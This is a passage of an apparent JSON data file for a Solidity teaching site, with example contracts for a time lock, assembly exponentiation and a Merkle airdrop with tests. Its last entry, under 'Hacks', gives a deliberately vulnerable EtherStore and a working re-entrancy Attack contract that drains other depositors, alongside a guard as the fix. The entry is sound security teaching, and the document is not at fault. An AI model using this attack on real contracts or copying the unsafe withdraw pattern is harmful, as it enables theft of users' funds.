onlyOwner returns (bytes memory) {\n        bytes32 txId = getTxId(_target, _value, _func, _data, _timestamp);\n        if (!queued[txId]) {\n            revert NotQueuedError(txId);\n        }\n        // ----|-------------------|-------\n        //  timestamp    timestamp + grace period\n        if (block.timestamp < _timestamp) {\n            revert TimestampNotPassedError(block.timestamp, _timestamp);\n        }\n        if (block.timestamp > _timestamp + GRACE_PERIOD) {\n            revert TimestampExpiredError(\n                block.timestamp, _timestamp + GRACE_PERIOD\n            );\n        }\n\n        queued[txId] = false;\n\n        // prepare data\n        bytes memory data;\n        if (bytes(_func).length > 0) {\n            // data = func selector + _data\n            data = abi.encodePacked(bytes4(keccak256(bytes(_func))), _data);\n        } else {\n            // call fallback with data\n            data = _data;\n        }\n\n        // call target\n        (bool ok, bytes memory res) = _target.call{value: _value}(data);\n        if (!ok) {\n            revert TxFailedError();\n        }\n\n        emit Execute(txId, _target, _value, _func, _data, _timestamp);\n\n        return res;\n    }\n\n    function cancel(bytes32 _txId) external onlyOwner {\n        if (!queued[_txId]) {\n            revert NotQueuedError(_txId);\n        }\n\n        queued[_txId] = false;\n\n        emit Cancel(_txId);\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "TimeLock.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract TimeLock {\n    error NotOwnerError();\n    error AlreadyQueuedError(bytes32 txId);\n    error TimestampNotInRangeError(uint256 blockTimestamp, uint256 timestamp);\n    error NotQueuedError(bytes32 txId);\n    error TimestampNotPassedError(uint256 blockTimestamp, uint256 timestamp);\n    error TimestampExpiredError(uint256 blockTimestamp, uint256 expiresAt);\n    error TxFailedError();\n\n    event Queue(\n        bytes32 indexed txId,\n        address indexed target,\n        uint256 value,\n        string func,\n        bytes data,\n        uint256 timestamp\n    );\n    event Execute(\n        bytes32 indexed txId,\n        address indexed target,\n        uint256 value,\n        string func,\n        bytes data,\n        uint256 timestamp\n    );\n    event Cancel(bytes32 indexed txId);\n\n    uint256 public constant MIN_DELAY = 10; // seconds\n    uint256 public constant MAX_DELAY = 1000; // seconds\n    uint256 public constant GRACE_PERIOD = 1000; // seconds\n\n    address public owner;\n    // tx id => queued\n    mapping(bytes32 => bool) public queued;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        if (msg.sender != owner) {\n            revert NotOwnerError();\n        }\n        _;\n    }\n\n    receive() external payable {}\n\n    function getTxId(\n        address _target,\n        uint256 _value,\n        string calldata _func,\n        bytes calldata _data,\n        uint256 _timestamp\n    ) public pure returns (bytes32) {\n        return keccak256(abi.encode(_target, _value, _func, _data, _timestamp));\n    }\n\n    /**\n     * @param _target Address of contract or account to call\n     * @param _value Amount of ETH to send\n     * @param _func Function signature, for example \"foo(address,uint256)\"\n     * @param _data ABI encoded data send.\n     * @param _timestamp Timestamp after which the transaction can be executed.\n     */\n    function queue(\n        address _target,\n        uint256 _value,\n        string calldata _func,\n        bytes calldata _data,\n        uint256 _timestamp\n    ) external onlyOwner returns (bytes32 txId) {\n        txId = getTxId(_target, _value, _func, _data, _timestamp);\n        if (queued[txId]) {\n            revert AlreadyQueuedError(txId);\n        }\n        // ---|------------|---------------|-------\n        //  block    block + min     block + max\n        if (\n            _timestamp < block.timestamp + MIN_DELAY\n                || _timestamp > block.timestamp + MAX_DELAY\n        ) {\n            revert TimestampNotInRangeError(block.timestamp, _timestamp);\n        }\n\n        queued[txId] = true;\n\n        emit Queue(txId, _target, _value, _func, _data, _timestamp);\n    }\n\n    function execute(\n        address _target,\n        uint256 _value,\n        string calldata _func,\n        bytes calldata _data,\n        uint256 _timestamp\n    ) external payable onlyOwner returns (bytes memory) {\n        bytes32 txId = getTxId(_target, _value, _func, _data, _timestamp);\n        if (!queued[txId]) {\n            revert NotQueuedError(txId);\n        }\n        // ----|-------------------|-------\n        //  timestamp    timestamp + grace period\n        if (block.timestamp < _timestamp) {\n            revert TimestampNotPassedError(block.timestamp, _timestamp);\n        }\n        if (block.timestamp > _timestamp + GRACE_PERIOD) {\n            revert TimestampExpiredError(\n                block.timestamp, _timestamp + GRACE_PERIOD\n            );\n        }\n\n        queued[txId] = false;\n\n        // prepare data\n        bytes memory data;\n        if (bytes(_func).length > 0) {\n            // data = func selector + _data\n            data = abi.encodePacked(bytes4(keccak256(bytes(_func))), _data);\n        } else {\n            // call fallback with data\n            data = _data;\n        }\n\n        // call target\n        (bool ok, bytes memory res) = _target.call{value: _value}(data);\n        if (!ok) {\n            revert TxFailedError();\n        }\n\n        emit Execute(txId, _target, _value, _func, _data, _timestamp);\n\n        return res;\n    }\n\n    function cancel(bytes32 _txId) external onlyOwner {\n        if (!queued[_txId]) {\n            revert NotQueuedError(_txId);\n        }\n\n        queued[_txId] = false;\n\n        emit Cancel(_txId);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "app",
      "application",
      "time",
      "lock"
    ],
    "order": 21
  },
  {
    "slug": "assembly-bin-exp",
    "title": "Assembly Binary Exponentiation",
    "category": "Applications",
    "categorySlug": "applications",
    "description": "Example of binary exponentiation in assembly",
    "content": "Example of binary exponentiation in `assembly`\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract AssemblyBinExp {\n    // Binary exponentiation to calculate x**n\n    function rpow(uint256 x, uint256 n, uint256 b)\n        public\n        pure\n        returns (uint256 z)\n    {\n        assembly {\n            switch x\n            // x = 0\n            case 0 {\n                switch n\n                // n = 0 --> x**n = 0**0 --> 1\n                case 0 { z := b }\n                // n > 0 --> x**n = 0**n --> 0\n                default { z := 0 }\n            }\n            default {\n                switch mod(n, 2)\n                // x > 0 and n is even --> z = 1\n                case 0 { z := b }\n                // x > 0 and n is odd --> z = x\n                default { z := x }\n\n                let half := div(b, 2) // for rounding.\n                // n = n / 2, while n > 0, n = n / 2\n                for { n := div(n, 2) } n { n := div(n, 2) } {\n                    let xx := mul(x, x)\n                    // Check overflow - revert if xx / x != x\n                    if iszero(eq(div(xx, x), x)) { revert(0, 0) }\n                    // Round (xx + half) / b\n                    let xxRound := add(xx, half)\n                    // Check overflow - revert if xxRound < xx\n                    if lt(xxRound, xx) { revert(0, 0) }\n                    x := div(xxRound, b)\n                    // if n % 2 == 1\n                    if mod(n, 2) {\n                        let zx := mul(z, x)\n                        // revert if x != 0 and zx / x != z\n                        if and(iszero(iszero(x)), iszero(eq(div(zx, x), z))) {\n                            revert(0, 0)\n                        }\n                        // Round (zx + half) / b\n                        let zxRound := add(zx, half)\n                        // Check overflow - revert if zxRound < zx\n                        if lt(zxRound, zx) { revert(0, 0) }\n                        z := div(zxRound, b)\n                    }\n                }\n            }\n        }\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "AssemblyBinExp.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract AssemblyBinExp {\n    // Binary exponentiation to calculate x**n\n    function rpow(uint256 x, uint256 n, uint256 b)\n        public\n        pure\n        returns (uint256 z)\n    {\n        assembly {\n            switch x\n            // x = 0\n            case 0 {\n                switch n\n                // n = 0 --> x**n = 0**0 --> 1\n                case 0 { z := b }\n                // n > 0 --> x**n = 0**n --> 0\n                default { z := 0 }\n            }\n            default {\n                switch mod(n, 2)\n                // x > 0 and n is even --> z = 1\n                case 0 { z := b }\n                // x > 0 and n is odd --> z = x\n                default { z := x }\n\n                let half := div(b, 2) // for rounding.\n                // n = n / 2, while n > 0, n = n / 2\n                for { n := div(n, 2) } n { n := div(n, 2) } {\n                    let xx := mul(x, x)\n                    // Check overflow - revert if xx / x != x\n                    if iszero(eq(div(xx, x), x)) { revert(0, 0) }\n                    // Round (xx + half) / b\n                    let xxRound := add(xx, half)\n                    // Check overflow - revert if xxRound < xx\n                    if lt(xxRound, xx) { revert(0, 0) }\n                    x := div(xxRound, b)\n                    // if n % 2 == 1\n                    if mod(n, 2) {\n                        let zx := mul(z, x)\n                        // revert if x != 0 and zx / x != z\n                        if and(iszero(iszero(x)), iszero(eq(div(zx, x), z))) {\n                            revert(0, 0)\n                        }\n                        // Round (zx + half) / b\n                        let zxRound := add(zx, half)\n                        // Check overflow - revert if zxRound < zx\n                        if lt(zxRound, zx) { revert(0, 0) }\n                        z := div(zxRound, b)\n                    }\n                }\n            }\n        }\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "assembly",
      "yul",
      "binary",
      "exponentiation",
      "math"
    ],
    "order": 22
  },
  {
    "slug": "airdrop",
    "title": "Merkle Airdrop",
    "category": "Applications",
    "categorySlug": "applications",
    "description": "Airdrop contract using Merkle tree",
    "content": "Example of airdrop contract using Merkle tree.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport {MerkleProof} from \"./MerkleProof.sol\";\n\ninterface IToken {\n    function mint(address to, uint256 amount) external;\n}\n\ncontract Airdrop {\n    event Claim(address to, uint256 amount);\n\n    IToken public immutable token;\n    bytes32 public immutable root;\n    mapping(bytes32 => bool) public claimed;\n\n    constructor(address _token, bytes32 _root) {\n        token = IToken(_token);\n        root = _root;\n    }\n\n    function getLeafHash(address to, uint256 amount)\n        public\n        pure\n        returns (bytes32)\n    {\n        return keccak256(abi.encode(to, amount));\n    }\n\n    function claim(bytes32[] memory proof, address to, uint256 amount)\n        external\n    {\n        // NOTE: (to, amount) cannot have duplicates\n        bytes32 leaf = getLeafHash(to, amount);\n\n        require(!claimed[leaf], \"airdrop already claimed\");\n        require(MerkleProof.verify(proof, root, leaf), \"invalid merkle proof\");\n        claimed[leaf] = true;\n\n        token.mint(to, amount);\n\n        emit Claim(to, amount);\n    }\n}\n\n```\n\n### Token\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// ERC20 + mint + authorization\ncontract Token {\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(\n        address indexed owner, address indexed spender, uint256 value\n    );\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n    string public name;\n    string public symbol;\n    uint8 public decimals;\n    mapping(address => bool) public authorized;\n\n    constructor(string memory _name, string memory _symbol, uint8 _decimals) {\n        name = _name;\n        symbol = _symbol;\n        decimals = _decimals;\n        authorized[msg.sender] = true;\n    }\n\n    function setAuthorized(address addr, bool auth) external {\n        require(authorized[msg.sender], \"not authorized\");\n        authorized[addr] = auth;\n    }\n\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool)\n    {\n        balanceOf[msg.sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    function approve(address spender, uint256 amount) external returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool)\n    {\n        allowance[sender][msg.sender] -= amount;\n        balanceOf[sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n        return true;\n    }\n\n    function _mint(address to, uint256 amount) internal {\n        balanceOf[to] += amount;\n        totalSupply += amount;\n        emit Transfer(address(0), to, amount);\n    }\n\n    function mint(address to, uint256 amount) external {\n        require(authorized[msg.sender], \"not authorized\");\n        _mint(to, amount);\n    }\n}\n\n```\n\n### Libraries copied from OpenZeppelin\n\n```solidity\n// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts\n\npragma solidity ^0.8.20;\n\nimport {Hashes} from \"./Hashes.sol\";\n\nlibrary MerkleProof {\n    function verify(bytes32[] memory proof, bytes32 root, bytes32 leaf)\n        internal\n        pure\n        returns (bool)\n    {\n        return processProof(proof, leaf) == root;\n    }\n\n    function processProof(bytes32[] memory proof, bytes32 leaf)\n        internal\n        pure\n        returns (bytes32)\n    {\n        bytes32 computedHash = leaf;\n        for (uint256 i = 0; i < proof.length; i++) {\n            computedHash = Hashes.commutativeKeccak256(computedHash, proof[i]);\n        }\n        return computedHash;\n    }\n}\n\n```\n\n```solidity\n// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts\n\npragma solidity ^0.8.0;\n\nlibrary Hashes {\n    function commutativeKeccak256(bytes32 a, bytes32 b)\n        internal\n        pure\n        returns (bytes32)\n    {\n        return a < b ? _efficientKeccak256(a, b) : _efficientKeccak256(b, a);\n    }\n\n    function _efficientKeccak256(bytes32 a, bytes32 b)\n        private\n        pure\n        returns (bytes32 value)\n    {\n        /// @solidity memory-safe-assembly\n        assembly {\n            mstore(0x00, a)\n            mstore(0x20, b)\n            value := keccak256(0x00, 0x40)\n        }\n    }\n}\n\n```\n\n### Test\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nlibrary MerkleHelper {\n    // Bubble sort\n    function sort(bytes32[] memory arr)\n        internal\n        pure\n        returns (bytes32[] memory)\n    {\n        uint256 n = arr.length;\n        for (uint256 i = 0; i < n; i++) {\n            for (uint256 j = 0; j < n - 1 - i; j++) {\n                if (arr[j] > arr[j + 1]) {\n                    (arr[j], arr[j + 1]) = (arr[j + 1], arr[j]);\n                }\n            }\n        }\n\n        return arr;\n    }\n\n    function yulKeccak256(bytes32 a, bytes32 b)\n        internal\n        pure\n        returns (bytes32 v)\n    {\n        assembly {\n            mstore(0x00, a)\n            mstore(0x20, b)\n            v := keccak256(0x00, 0x40)\n        }\n    }\n\n    function calcRoot(bytes32[] memory hashes)\n        internal\n        pure\n        returns (bytes32)\n    {\n        uint256 n = hashes.length;\n\n        while (n > 1) {\n            for (uint256 i = 0; i < n; i += 2) {\n                bytes32 left = hashes[i];\n                bytes32 right = hashes[i + 1 < n ? i + 1 : i];\n                (left, right) = left <= right ? (left, right) : (right, left);\n                hashes[i >> 1] = yulKeccak256(left, right);\n            }\n            n = (n + (n & 1)) >> 1;\n        }\n\n        return hashes[0];\n    }\n\n    function getProof(bytes32[] memory hashes, uint256 index)\n        internal\n        pure\n        returns (bytes32[] memory)\n    {\n        bytes32[] memory proof = new bytes32[](0);\n        uint256 len = 0;\n\n        uint256 n = hashes.length;\n        uint256 k = index;\n\n        while (n > 1) {\n            // Get proof for this level\n            uint256 j = k & 1 == 1 ? k - 1 : (k + 1 < n ? k + 1 : k);\n            bytes32 h = hashes[j];\n\n            // proof.push(h)\n            assembly {\n                len := add(len, 1)\n                let pos := add(proof, shl(5, len))\n                mstore(pos, h)\n                mstore(proof, len)\n                mstore(0x40, add(pos, 0x20))\n            }\n\n            k >>= 1;\n\n            // Calculate next level of hashes\n            for (uint256 i = 0; i < n; i += 2) {\n                bytes32 left = hashes[i];\n                bytes32 right = hashes[i + 1 < n ? i + 1 : i];\n                (left, right) = left <= right ? (left, right) : (right, left);\n                hashes[i >> 1] = yulKeccak256(left, right);\n            }\n            n = (n + (n & 1)) >> 1;\n        }\n\n        return proof;\n    }\n\n    function verify(bytes32[] memory proof, bytes32 root, bytes32 leaf)\n        internal\n        pure\n        returns (bool)\n    {\n        bytes32 h = leaf;\n\n        for (uint256 i = 0; i < proof.length; i++) {\n            (bytes32 left, bytes32 right) =\n                h <= proof[i] ? (h, proof[i]) : (proof[i], h);\n            h = yulKeccak256(left, right);\n        }\n\n        return h == root;\n    }\n}\n\n```\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport {Test, console2} from \"forge-std/Test.sol\";\nimport {MerkleHelper} from \"./MerkleHelper.sol\";\nimport {Airdrop} from \"../../../src/app/airdrop/Airdrop.sol\";\nimport {Token} from \"../../../src/app/airdrop/Token.sol\";\n\ncontract AirdropTest is Test {\n    Token private token;\n    Airdrop private airdrop;\n\n    struct Reward {\n        address to;\n        uint256 amount;\n    }\n\n    Reward[] private rewards;\n    bytes32[] private hashes;\n    mapping(bytes32 => Reward) private hashToReward;\n\n    uint256 constant N = 100;\n\n    function setUp() public {\n        token = new Token(\"test\", \"TEST\", 18);\n\n        // Initialize users and airdrop amounts\n        for (uint256 i = 0; i < N; i++) {\n            rewards.push(\n                Reward({to: address(uint160(i)), amount: (i + 1) * 100})\n            );\n            hashes.push(keccak256(abi.encode(rewards[i].to, rewards[i].amount)));\n            hashToReward[hashes[i]] = rewards[i];\n        }\n\n        hashes = MerkleHelper.sort(hashes);\n\n        bytes32 root = MerkleHelper.calcRoot(hashes);\n\n        airdrop = new Airdrop(address(token), root);\n\n        token.setAuthorized(address(airdrop), true);\n    }\n\n    function test_valid_proof() public {\n        for (uint256 i = 0; i < N; i++) {\n            bytes32 h = hashes[i];\n            Reward memory reward = hashToReward[h];\n            bytes32[] memory proof = MerkleHelper.getProof(hashes, i);\n\n            airdrop.claim(proof, reward.to, reward.amount);\n            assertEq(token.balanceOf(reward.to), reward.amount);\n        }\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "Airdrop.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport {MerkleProof} from \"./MerkleProof.sol\";\n\ninterface IToken {\n    function mint(address to, uint256 amount) external;\n}\n\ncontract Airdrop {\n    event Claim(address to, uint256 amount);\n\n    IToken public immutable token;\n    bytes32 public immutable root;\n    mapping(bytes32 => bool) public claimed;\n\n    constructor(address _token, bytes32 _root) {\n        token = IToken(_token);\n        root = _root;\n    }\n\n    function getLeafHash(address to, uint256 amount)\n        public\n        pure\n        returns (bytes32)\n    {\n        return keccak256(abi.encode(to, amount));\n    }\n\n    function claim(bytes32[] memory proof, address to, uint256 amount)\n        external\n    {\n        // NOTE: (to, amount) cannot have duplicates\n        bytes32 leaf = getLeafHash(to, amount);\n\n        require(!claimed[leaf], \"airdrop already claimed\");\n        require(MerkleProof.verify(proof, root, leaf), \"invalid merkle proof\");\n        claimed[leaf] = true;\n\n        token.mint(to, amount);\n\n        emit Claim(to, amount);\n    }\n}\n"
      },
      {
        "fileName": "AirdropTest.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport {Test, console2} from \"forge-std/Test.sol\";\nimport {MerkleHelper} from \"./MerkleHelper.sol\";\nimport {Airdrop} from \"../../../src/app/airdrop/Airdrop.sol\";\nimport {Token} from \"../../../src/app/airdrop/Token.sol\";\n\ncontract AirdropTest is Test {\n    Token private token;\n    Airdrop private airdrop;\n\n    struct Reward {\n        address to;\n        uint256 amount;\n    }\n\n    Reward[] private rewards;\n    bytes32[] private hashes;\n    mapping(bytes32 => Reward) private hashToReward;\n\n    uint256 constant N = 100;\n\n    function setUp() public {\n        token = new Token(\"test\", \"TEST\", 18);\n\n        // Initialize users and airdrop amounts\n        for (uint256 i = 0; i < N; i++) {\n            rewards.push(\n                Reward({to: address(uint160(i)), amount: (i + 1) * 100})\n            );\n            hashes.push(keccak256(abi.encode(rewards[i].to, rewards[i].amount)));\n            hashToReward[hashes[i]] = rewards[i];\n        }\n\n        hashes = MerkleHelper.sort(hashes);\n\n        bytes32 root = MerkleHelper.calcRoot(hashes);\n\n        airdrop = new Airdrop(address(token), root);\n\n        token.setAuthorized(address(airdrop), true);\n    }\n\n    function test_valid_proof() public {\n        for (uint256 i = 0; i < N; i++) {\n            bytes32 h = hashes[i];\n            Reward memory reward = hashToReward[h];\n            bytes32[] memory proof = MerkleHelper.getProof(hashes, i);\n\n            airdrop.claim(proof, reward.to, reward.amount);\n            assertEq(token.balanceOf(reward.to), reward.amount);\n        }\n    }\n}\n"
      },
      {
        "fileName": "Hashes.sol",
        "code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts\n\npragma solidity ^0.8.0;\n\nlibrary Hashes {\n    function commutativeKeccak256(bytes32 a, bytes32 b)\n        internal\n        pure\n        returns (bytes32)\n    {\n        return a < b ? _efficientKeccak256(a, b) : _efficientKeccak256(b, a);\n    }\n\n    function _efficientKeccak256(bytes32 a, bytes32 b)\n        private\n        pure\n        returns (bytes32 value)\n    {\n        /// @solidity memory-safe-assembly\n        assembly {\n            mstore(0x00, a)\n            mstore(0x20, b)\n            value := keccak256(0x00, 0x40)\n        }\n    }\n}\n"
      },
      {
        "fileName": "MerkleHelper.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nlibrary MerkleHelper {\n    // Bubble sort\n    function sort(bytes32[] memory arr)\n        internal\n        pure\n        returns (bytes32[] memory)\n    {\n        uint256 n = arr.length;\n        for (uint256 i = 0; i < n; i++) {\n            for (uint256 j = 0; j < n - 1 - i; j++) {\n                if (arr[j] > arr[j + 1]) {\n                    (arr[j], arr[j + 1]) = (arr[j + 1], arr[j]);\n                }\n            }\n        }\n\n        return arr;\n    }\n\n    function yulKeccak256(bytes32 a, bytes32 b)\n        internal\n        pure\n        returns (bytes32 v)\n    {\n        assembly {\n            mstore(0x00, a)\n            mstore(0x20, b)\n            v := keccak256(0x00, 0x40)\n        }\n    }\n\n    function calcRoot(bytes32[] memory hashes)\n        internal\n        pure\n        returns (bytes32)\n    {\n        uint256 n = hashes.length;\n\n        while (n > 1) {\n            for (uint256 i = 0; i < n; i += 2) {\n                bytes32 left = hashes[i];\n                bytes32 right = hashes[i + 1 < n ? i + 1 : i];\n                (left, right) = left <= right ? (left, right) : (right, left);\n                hashes[i >> 1] = yulKeccak256(left, right);\n            }\n            n = (n + (n & 1)) >> 1;\n        }\n\n        return hashes[0];\n    }\n\n    function getProof(bytes32[] memory hashes, uint256 index)\n        internal\n        pure\n        returns (bytes32[] memory)\n    {\n        bytes32[] memory proof = new bytes32[](0);\n        uint256 len = 0;\n\n        uint256 n = hashes.length;\n        uint256 k = index;\n\n        while (n > 1) {\n            // Get proof for this level\n            uint256 j = k & 1 == 1 ? k - 1 : (k + 1 < n ? k + 1 : k);\n            bytes32 h = hashes[j];\n\n            // proof.push(h)\n            assembly {\n                len := add(len, 1)\n                let pos := add(proof, shl(5, len))\n                mstore(pos, h)\n                mstore(proof, len)\n                mstore(0x40, add(pos, 0x20))\n            }\n\n            k >>= 1;\n\n            // Calculate next level of hashes\n            for (uint256 i = 0; i < n; i += 2) {\n                bytes32 left = hashes[i];\n                bytes32 right = hashes[i + 1 < n ? i + 1 : i];\n                (left, right) = left <= right ? (left, right) : (right, left);\n                hashes[i >> 1] = yulKeccak256(left, right);\n            }\n            n = (n + (n & 1)) >> 1;\n        }\n\n        return proof;\n    }\n\n    function verify(bytes32[] memory proof, bytes32 root, bytes32 leaf)\n        internal\n        pure\n        returns (bool)\n    {\n        bytes32 h = leaf;\n\n        for (uint256 i = 0; i < proof.length; i++) {\n            (bytes32 left, bytes32 right) =\n                h <= proof[i] ? (h, proof[i]) : (proof[i], h);\n            h = yulKeccak256(left, right);\n        }\n\n        return h == root;\n    }\n}\n"
      },
      {
        "fileName": "MerkleProof.sol",
        "code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts\n\npragma solidity ^0.8.20;\n\nimport {Hashes} from \"./Hashes.sol\";\n\nlibrary MerkleProof {\n    function verify(bytes32[] memory proof, bytes32 root, bytes32 leaf)\n        internal\n        pure\n        returns (bool)\n    {\n        return processProof(proof, leaf) == root;\n    }\n\n    function processProof(bytes32[] memory proof, bytes32 leaf)\n        internal\n        pure\n        returns (bytes32)\n    {\n        bytes32 computedHash = leaf;\n        for (uint256 i = 0; i < proof.length; i++) {\n            computedHash = Hashes.commutativeKeccak256(computedHash, proof[i]);\n        }\n        return computedHash;\n    }\n}\n"
      },
      {
        "fileName": "Token.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// ERC20 + mint + authorization\ncontract Token {\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(\n        address indexed owner, address indexed spender, uint256 value\n    );\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n    string public name;\n    string public symbol;\n    uint8 public decimals;\n    mapping(address => bool) public authorized;\n\n    constructor(string memory _name, string memory _symbol, uint8 _decimals) {\n        name = _name;\n        symbol = _symbol;\n        decimals = _decimals;\n        authorized[msg.sender] = true;\n    }\n\n    function setAuthorized(address addr, bool auth) external {\n        require(authorized[msg.sender], \"not authorized\");\n        authorized[addr] = auth;\n    }\n\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool)\n    {\n        balanceOf[msg.sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    function approve(address spender, uint256 amount) external returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool)\n    {\n        allowance[sender][msg.sender] -= amount;\n        balanceOf[sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n        return true;\n    }\n\n    function _mint(address to, uint256 amount) internal {\n        balanceOf[to] += amount;\n        totalSupply += amount;\n        emit Transfer(address(0), to, amount);\n    }\n\n    function mint(address to, uint256 amount) external {\n        require(authorized[msg.sender], \"not authorized\");\n        _mint(to, amount);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "app",
      "application",
      "merkle",
      "airdrop"
    ],
    "order": 23
  },
  {
    "slug": "re-entrancy",
    "title": "Re-Entrancy",
    "category": "Hacks",
    "categorySlug": "hacks",
    "description": "An example of re-entrancy attack in Solidity",
    "content": "### Vulnerability\n\nLet's say that contract `A` calls contract `B`.\n\nReentrancy exploit allows `B` to call back into `A` before `A` finishes execution.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/*\nEtherStore is a contract where you can deposit and withdraw ETH.\nThis contract is vulnerable to re-entrancy attack.\nLet's see why.\n\n1. Deploy EtherStore\n2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore\n3. Deploy Attack with address of EtherStore\n4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).\n   You will get 3 Ether back (2 Ether stolen from Alice and Bob,\n   plus 1 Ether sent from this contract).\n\nWhat happened?\nAttack was able to call EtherStore.withdraw multiple times before\nEtherStore.withdraw finished executing.\n\nHere is how the functions were called\n- Attack.attack\n- EtherStore.deposit\n- EtherStore.withdraw\n- Attack fallback (receives 1 Ether)\n- EtherStore.withdraw\n- Attack.fallback (receives 1 Ether)\n- EtherStore.withdraw\n- Attack fallback (receives 1 Ether)\n*/\n\ncontract EtherStore {\n    mapping(address => uint256) public balances;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdraw() public {\n        uint256 bal = balances[msg.sender];\n        require(bal > 0);\n\n        (bool sent,) = msg.sender.call{value: bal}(\"\");\n        require(sent, \"Failed to send Ether\");\n\n        balances[msg.sender] = 0;\n    }\n\n    // Helper function to check the balance of this contract\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\ncontract Attack {\n    EtherStore public etherStore;\n    uint256 public constant AMOUNT = 1 ether;\n\n    constructor(address _etherStoreAddress) {\n        etherStore = EtherStore(_etherStoreAddress);\n    }\n\n    // Fallback is called when EtherStore sends Ether to this contract.\n    fallback() external payable {\n        if (address(etherStore).balance >= AMOUNT) {\n            etherStore.withdraw();\n        }\n    }\n\n    function attack() external payable {\n        require(msg.value >= AMOUNT);\n        etherStore.deposit{value: AMOUNT}();\n        etherStore.withdraw();\n    }\n\n    // Helper function to check the balance of this contract\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\n```\n\n### Preventative Techniques\n\n- Ensure all state changes happen before calling external contracts\n- Use function modifiers that prevent re-entrancy\n\nHere is an example of a re-entrancy guard\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract ReEntrancyGuard {\n    bool internal locked;\n\n    modifier noReentrant() {\n        require(!locked, \"No re-entrancy\");\n        locked = true;\n        _;\n        locked = false;\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "ReEntrancy.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/*\nEtherStore is a contract where you can deposit and withdraw ETH.\nThis contract is vulnerable to re-entrancy attack.\nLet's see why.\n\n1. Deploy EtherStore\n2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore\n3. Deploy Attack with address of EtherStore\n4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).\n   You will get 3 Ether back (2 Ether stolen from Alice and Bob,\n   plus 1 Ether sent from this contract).\n\nWhat happened?\nAttack was able to call EtherStore.withdraw multiple times before\nEtherStore.withdraw finished executing.\n\nHere is how the functions were called\n- Attack.attack\n- EtherStore.deposit\n- EtherStore.withdraw\n- Attack fallback (receives 1 Ether)\n- EtherStore.withdraw\n- Attack.fallback (receives 1 Ether)\n- EtherStore.withdraw\n- Attack fallback (receives 1 Ether)\n*/\n\ncontract EtherStore {\n    mapping(address => uint256) public balances;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdraw() public {\n        uint256 bal = balances[msg.sender];\n        require(bal > 0);\n\n        (bool sent,) = msg.sender.call{value: bal}(\"\");\n        require(sent, \"Failed to send Ether\");\n\n        balances[msg.sender] = 0;\n    }\n\n    // Helper function to check the balance of this contract\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\ncontract Attack {\n    EtherStore public etherStore;\n    uint256 public constant AMOUNT = 1 ether;\n\n    constructor(address _etherStoreAddress) {\n        etherStore = EtherStore(_etherStoreAddress);\n    }\n\n    // Fallback is called when EtherStore sends Ether to this contract.\n    fallback() external payable {\n        if (address(etherStore).balance >= AMOUNT) {\n            etherStore.withdraw();\n        }\n    }\n\n    function attack() external payable {\n        require(msg.value >= AMOUNT);\n        etherStore.deposit{value: 